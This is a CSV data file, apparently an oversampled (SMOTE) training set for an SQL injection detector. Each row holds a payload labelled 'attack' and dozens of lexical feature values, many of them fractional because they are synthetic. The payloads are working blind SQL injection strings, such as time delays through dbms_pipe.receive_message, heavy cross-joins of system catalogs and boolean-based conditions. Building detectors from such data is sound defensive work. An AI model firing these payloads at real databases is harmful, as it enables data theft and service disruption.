id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000029,attack,boolean,"1"" where 3018  =  3018 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",nearest_attack_euclidean,R000067,2.307552391911795,134.2139937926652,32.0,3.8262574928440922,39.0534984481663,19.620371508374173,51.02674922408315,24.513374612041574,0.2911258123261984,0.14469913386793917,0.3811016494858717,0.1830734043199907,0.0,0.5133746120415748,2.0,0.0,0.0,1.5133746120415748,0.0,10.486625387958425,0.0,2.0,1.0,9.513374612041574,0.0,0.5133746120415748,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.5133746120415748,0.0,0.4866253879584253,0.5133746120415748,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.5133746120415748
SMOTE_000030,attack,boolean,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",nearest_attack_euclidean,R000071,1.0879488970425393,140.67302708604262,30.729007387102534,4.108864656768817,77.67302708604262,8.243002462367512,37.0,17.75699753763249,0.55166816002435,0.058561916307673156,0.2633060012555405,0.12646392241243634,4.0,0.0,0.0,0.0,1.0,1.7569975376324884,0.0,4.0,1.513995075264977,0.0,2.2430024623675116,2.7569975376324884,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.7569975376324884,0.24300246236751155,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000031,attack,boolean,"-2925%"" or make_set  (  9354  =  9354,7185  )   and ""%""  =  """,nearest_attack_euclidean,R000018,0.7738884830535745,63.54437361316972,26.575937731138378,3.8450831379113484,12.706770448102702,15.43458364151784,22.54437361316972,12.85864591037946,0.19933191823536586,0.24669010672792543,0.3495163557044944,0.2044616193322143,0.0,4.0,1.0,0.0,0.0,1.85864591037946,0.0,2.5654163584821608,1.7172918207589196,0.8586459103794598,0.8586459103794598,2.85864591037946,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000032,attack,boolean,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa",nearest_attack_euclidean,R000031,1.5899795132890415,75.6288470573534,23.977308234412035,3.6688337508832043,20.022691765587965,15.606155291765432,28.32576941147068,11.674230588529321,0.26556164940969684,0.2050428463641888,0.3747005163946177,0.15469498783149657,3.348461177058642,0.0,0.0,0.0,0.32576941147067895,2.0,0.0,4.0,0.0,0.674230588529321,0.674230588529321,2.977308234412037,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.32576941147067895,0.0,0.3257694114706789,0.0,1.674230588529321,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.325769411470679
SMOTE_000033,attack,boolean,"1'+  (  select 'wkbg' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'",nearest_attack_euclidean,R000073,0.12035020053976322,136.0232371750065,36.84052851836841,3.9898638204786963,46.48171768469733,21.0,49.62125523112497,18.920264259184204,0.34098400593714573,0.15498606663278564,0.36471052653564995,0.13931940089441874,4.0,0.0,0.0,0.0,0.9800660647960512,2.0,0.0,7.920264259184205,0.0,0.9800660647960512,1.0,5.019933935203949,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.019933935203948955,1.980066064796051,0.0,1.0,0.9800660647960511,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.960132129592102
SMOTE_000034,attack,boolean,"1  )   as wxms where 7272  =  7272 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000024,1.4091198561411973,159.9081774439222,32.830907841120634,4.065496358626936,82.58454607943969,16.0,45.492723523361896,15.83090784112063,0.516754505461647,0.10010366478550742,0.2842281327900871,0.09891369696275851,0.0,0.4154539205603156,2.0,0.0,1.0,2.0,0.0,5.415453920560315,0.0,0.0,2.0,5.0,0.0,0.41545392056031566,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.5845460794396844,0.4154539205603156,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000035,attack,boolean,"1 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  -- dpph",nearest_attack_euclidean,R000014,0.5147838156626697,133.45711162863853,32.0,4.273613630327301,74.08577674272291,10.066593800156603,34.45711162863854,14.847629457120485,0.5552921790487758,0.07528433053754319,0.25814098027616184,0.11128251013751914,0.0,0.0,2.0,0.0,1.0,1.1523705428795148,0.0,4.0,0.0,0.0,2.8476294571204854,4.152370542879515,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.15237054287951468,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.1523705428795146
SMOTE_000036,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and 'qipt'  =  'qipt",nearest_attack_euclidean,R000020,0.3965878796918767,115.55185006382092,28.817429404256362,4.1293778953107,71.0,5.0,23.27799417020546,16.273855893615455,0.6154291312085653,0.043340079662575026,0.2004520312039214,0.1407787579249382,2.7261441063845444,0.2738558936154557,0.0,0.0,1.0,1.0,0.0,2.2738558936154556,0.0,5.0,4.0,2.0,0.9087147021281814,0.0912852978718186,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000037,attack,boolean,1'   )    )    rlike   (  select   (  case when   (  6205  =  1384  )   then 1 else 0x28 end   )    )    and    (    (   'ahjf'  =  'ahjf,nearest_attack_euclidean,R000078,1.061053033844958,131.5876051736233,29.0,3.43767255170309,43.665352254269756,13.0,60.17126711005585,14.750985809297683,0.33338084774798554,0.0990323247435188,0.45577358444893545,0.11181324305956028,4.0,0.0,0.0,0.0,0.0,1.583661936432561,0.0,9.167323872865122,0.0,0.0,0.0,1.5836619364325615,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000038,attack,boolean,"1'+  (  select 'wkbg' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'",nearest_attack_euclidean,R000073,0.938640386768065,139.8266349037007,36.66745471721168,4.046176605382478,51.8219066004306,20.334909434423366,48.83609151024089,18.83372735860584,0.36807988263271685,0.14615239641379688,0.35070683437851774,0.13506088657496856,3.501182075817524,0.0,0.33254528278831763,0.0,1.0,2.0,0.0,7.501182075817524,0.0,0.8337273586058412,1.3325452827883175,5.0,1.0,0.0,0.1662726413941588,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.8337273586058414,0.0,1.0,1.0,0.8337273586058412,0.16627264139415876,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.833727358605842
SMOTE_000039,attack,boolean,"1'  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  'vxqs'  =  'vxqs",nearest_attack_euclidean,R000013,1.3896512548688777,151.71789375852853,32.478595839019015,3.8195874303491024,49.871575034114095,14.564212482942953,59.76070208049049,27.521404160980985,0.32845389281415616,0.09614301990143327,0.39394480040605284,0.1814582868783577,3.0428083219619673,0.7178937585285243,0.0,0.0,0.0,1.760702080490492,0.0,12.0,0.0,2.0,1.0,7.760702080490492,0.760702080490492,0.23929791950950818,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.23929791950950813,0.0,0.0,0.23929791950950818,1.0,0.760702080490492,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.239297919509508
SMOTE_000040,attack,boolean,"1'||  (  select 'xpjg' where 3036  =  3036 and elt  (  1832  =  6644,6644   )    )   ||'",nearest_attack_euclidean,R000030,1.1747021644882742,85.2882019905328,28.0960673301776,3.8150036311833424,20.0960673301776,21.0,30.397378220118398,13.7947564402368,0.2353857427005811,0.24682792839453557,0.3567369133578686,0.1610494155470147,3.3973782201183993,0.0,0.0,0.0,0.3013108899408004,2.0,0.0,4.0,0.0,0.0,0.6986891100591998,5.698689110059199,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.6986891100591996,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000041,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   'ootz' like 'ootz",nearest_attack_euclidean,R000054,2.474105864620468,138.03180188957273,29.953278302659093,4.126361353168948,84.78131132106364,5.343933963190912,33.34393396319091,14.562622642127273,0.6162037206995864,0.03755110115832219,0.24120444134439545,0.10504073679769596,3.3906556605318183,0.0,0.0,0.0,1.0,0.39065566053181855,0.0,4.0,0.0,0.0,2.3906556605318183,1.3906556605318188,1.0,0.0,0.0,0.0,0.0,0.39065566053181844,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.39065566053181844,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.3906556605318183
SMOTE_000042,attack,boolean,"-8425""   )    )    or   (  6485  =  1127  )  *1127 and    (    (   ""qruf""  =  ""qruf",nearest_attack_euclidean,R000039,0.5185432561536394,84.17522852380594,22.0,3.17451845659571,13.73451782737871,15.559289303572774,40.88142139285445,14.0,0.16267536195722967,0.18543854836695953,0.4853897570044594,0.16649633267135136,0.0,4.0,0.853096434524258,0.0,1.0,1.853096434524258,0.0,6.2938071309514845,0.0,0.0,0.0,3.706192869048516,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.146903565475742,0.853096434524258,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000043,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  'qomf' like 'qomf",nearest_attack_euclidean,R000022,1.8812657394157428,142.06984299346323,33.588057855586484,4.05976786167599,66.38866114659244,8.588057855586484,45.06984299346323,22.02328099782108,0.47223461061435923,0.059604922999157664,0.31399099650808326,0.15416946987839977,3.0,0.0,0.0,0.0,0.2823884288827031,0.0,0.0,9.023280997821079,0.0,2.847165286648109,1.8471652866481092,4.588057855586484,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.7176115711172969,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000044,attack,boolean,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',nearest_attack_euclidean,R000029,0.841270340998005,110.82822925366631,27.450379912196034,3.534749321616594,36.70227947317622,13.0,47.35113973658811,13.774810043901981,0.3297395318816099,0.11774442415603995,0.42753040444274026,0.12498563951960986,4.0,0.0,0.0,0.0,0.0,1.774810043901982,0.0,6.450379912196036,1.549620087803964,0.0,0.0,1.774810043901982,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000045,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000033,1.647412986497125,159.6257214756875,35.20244966435119,3.898075040404508,47.012248321755955,24.0,60.208573825229166,28.404899328702378,0.2937376871880036,0.15099541158825314,0.3773736617132405,0.17789323951050273,2.803674496526786,0.0,0.7975503356488094,0.0,0.0,2.0,0.0,11.601224832175596,0.0,2.0,1.0,10.0,1.0,0.0,0.3987751678244046,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.6012248321755953,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.6012248321755953
SMOTE_000046,attack,boolean,"1  )   where 5333  =  5333 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000076,1.0024247527154455,144.33883124444432,31.554822500740755,4.0688075383924405,68.55482250074076,16.0,44.56141999407395,15.222588749629622,0.4760343069984446,0.11104649482128072,0.30738625832615973,0.10553293985411491,0.0,0.0,1.5548225007407561,0.0,1.0,2.0,0.0,5.667766248888866,0.0,0.0,2.0,4.554822500740756,0.0,0.0,0.7774112503703781,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.7774112503703778,1.0,0.22258874962962205,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000047,attack,boolean,"1 where 3175  =  3175 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000052,1.5980035585548655,102.02789552722784,29.75697388180696,3.7613729295171874,33.75697388180696,17.411158210891138,38.308368658168355,12.551394776361391,0.33165229798043466,0.1684043911827672,0.3762088114484057,0.1237344993883925,0.0,0.0,2.0,0.0,1.0,1.5513947763613922,0.0,6.0,0.0,1.0,1.0,4.551394776361392,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.5513947763613922,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.5513947763613922
SMOTE_000048,attack,boolean,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',nearest_attack_euclidean,R000029,1.6229021723247128,111.82074394631826,27.0,3.5147861209105855,36.41037197315913,13.0,48.41037197315913,14.0,0.3248996662072188,0.11673355586185416,0.43265371777200723,0.12571306015891986,2.794814013420435,1.205185986579565,0.0,0.0,0.0,2.0,0.0,6.602592993289782,1.3974070067102178,0.0,0.0,2.0,0.6987035033551088,0.3012964966448912,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000049,attack,boolean,"1%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  """,nearest_attack_euclidean,R000037,1.148572358789195,139.39058427527098,32.326176965591124,3.4906428325217465,37.60941572472901,15.0,64.08587641290649,22.69529213763549,0.270751870048194,0.10769083644476221,0.45898858103396534,0.16256871247307841,2.0,4.0,0.0,1.0,0.0,2.0,0.0,11.347646068817745,1.3476460688177465,0.0,1.0,3.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000050,attack,boolean,"-6846%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,nearest_attack_euclidean,R000009,1.3708326852770256,72.62199959597538,21.18900020201231,3.191228624399956,6.915375176760769,16.0,34.52749949496923,15.179124924245384,0.10099507997247231,0.22270555811462509,0.4670507722532712,0.20924858965963133,0.0,4.0,1.0,0.0,0.7263749747484614,2.0,0.0,4.905499898993845,2.0,0.27362502525153876,0.27362502525153887,3.7263749747484614,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000051,attack,boolean,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa",nearest_attack_euclidean,R000031,0.1880293871471133,75.5079986835834,23.10771419168453,3.6029894691634543,21.0,13.0,29.292570300214344,12.215428383369057,0.2789207659159626,0.17266523604321496,0.3865826534206889,0.16183134462013352,4.0,0.0,0.0,0.0,0.0,2.0,0.0,4.215428383369057,0.0,1.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000052,attack,boolean,"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap",nearest_attack_euclidean,R000049,4.966418612690076,76.62029870612758,25.780696980964365,3.7057881005240603,20.780696980964365,15.08019913741839,27.83960172516322,12.91980086258161,0.2704285804390014,0.1966377356274518,0.36399336208605365,0.1689403218474931,0.0,2.16039827483678,0.5400995687091951,0.0,0.0,1.0,0.0,4.459900431290805,0.0,1.0,2.379701293872415,1.5400995687091954,0.0,0.540099568709195,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.540099568709195,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.45990043129080505,0.4599004312908051,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.459900431290805
SMOTE_000053,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'ugum",nearest_attack_euclidean,R000050,0.022238004479660903,148.9453625179686,32.98509886853689,4.342118629174036,85.94536251796859,8.995032956178964,37.0,17.004967043821036,0.5770138040381296,0.06039060635195739,0.24842046429506676,0.11417512531484625,4.0,0.0,0.0,0.0,1.0,1.0049670438210376,0.0,4.0,0.009934087642074818,0.0,2.995032956178963,2.0049670438210376,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0049670438210374,0.9950329561789625,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000054,attack,boolean,"-9281  )   where 8363  =  8363 or make_set  (  8220  =  5127,5127  )  --",nearest_attack_euclidean,R000005,0.042872719416313106,72.01947290432659,26.0,3.8468196057519,13.999999999999996,24.0,24.0,10.019472904326598,0.19439257597782106,0.33324441596197896,0.33324441596197896,0.13911859209822092,0.0,0.01947290432659865,3.0,0.0,0.0,2.0,0.0,3.0,0.0,1.0,1.0,5.0,0.0,0.019472904326598872,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000055,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and 'qjle'  =  'qjle",nearest_attack_euclidean,R000068,0.2162439076315465,113.30660121260601,28.303500159553423,4.211608457922921,73.7891004148389,3.364200191464107,23.849800446749583,12.303500159553423,0.6527727345986383,0.029052930504546687,0.20970288540415172,0.10847144949266327,3.0607000319106845,0.0,0.0,0.0,1.0,1.0,0.0,2.121400063821369,0.0,0.0,2.0607000319106845,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.06070003191068446,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0607000319106845
SMOTE_000056,attack,boolean,"1'  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  'vxqs'  =  'vxqs",nearest_attack_euclidean,R000013,1.3835398792416762,151.7147366222302,32.476491081486785,3.8195303545477555,49.8589464889207,14.57052675553965,59.76175445925661,27.523508918513215,0.32837827034412176,0.09618619395075273,0.39395978008144567,0.18147575562367985,3.0470178370264325,0.7147366222301755,0.0,0.0,0.0,1.7617544592566081,0.0,12.0,0.0,2.0,1.0,7.761754459256609,0.7617544592566083,0.23824554074339177,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.23824554074339177,0.0,0.0,0.23824554074339185,1.0,0.7617544592566082,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.238245540743392
SMOTE_000057,attack,boolean,"1 where 3902  =  3902 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000007,0.04237867118759615,136.3298243006944,32.0,4.234542169227226,69.0,16.0,37.26385944055553,14.06596486013888,0.5061661516088906,0.11737186124264129,0.27329377267364713,0.10316821447482093,0.0,0.0,2.0,0.0,1.0,2.0,0.0,4.065964860138881,0.0,0.0,2.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
